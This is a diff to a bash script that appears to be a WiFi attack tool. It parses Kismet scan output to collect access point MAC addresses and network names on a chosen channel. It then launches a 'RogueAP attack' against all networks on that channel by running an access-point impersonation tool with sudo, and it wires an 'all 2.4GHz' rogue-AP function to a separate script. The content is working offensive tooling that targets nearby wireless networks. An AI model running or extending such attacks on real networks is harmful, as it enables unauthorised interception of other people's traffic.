@@ -500,17 +500,19 @@ echo ""
 
 echo  "\n\n${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
 echo "---------------------------------------------------------------------------------------"
-awk -F';' '{print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
+awk -F';' -v track="$chann" '$6 == track {print "     " $6 "               " $3}' generated-01.kismet.csv  | nl -n ln -w 8
 
 echo ""
 echo "sending AP MAC addresses in channel $chann to export file..."
 sleep 3
-awk -F';' '{print "     " $4 }' generated-01.kismet.csv >> APs.txt
+
+awk -F';' -v address="$chann" '$6 == address {print $4}' generated-01.kismet.csv >> APs.txt
+
 sed -i '/BSSID/d' APs.txt
 sed -i 's/^[[:space:]]*//' APs.txt
 echo ""
 echo "sending AP ESSID in channel $chann to export file..."
-awk -F';' '{print "     " $3 }' generated-01.kismet.csv >> Names.txt
+awk -F';' -v essid="$chann" '$6 == essid {print $3}'  generated-01.kismet.csv >> Names.txt
 echo ""
 echo "showing MACs..."
 echo ""
@@ -521,7 +523,7 @@ echo "showing Names..."
 cat Names.txt
 echo ""
 echo "Starting RogueAP attack in all networks from channel $chann"
-
+echo ""
 sudo timeout 1000s $Tool -e $AirDumper -c $chann $wifiInterfaceMon &
 
 file="APs.txt"
@@ -546,7 +548,9 @@ fi
 #### All 2.4GHz band RogueAP attack ####
 
 AllRogueAP(){
-        echo "in develop..."
+
+sudo ./RogueMake.sh        
+
 }
 
 
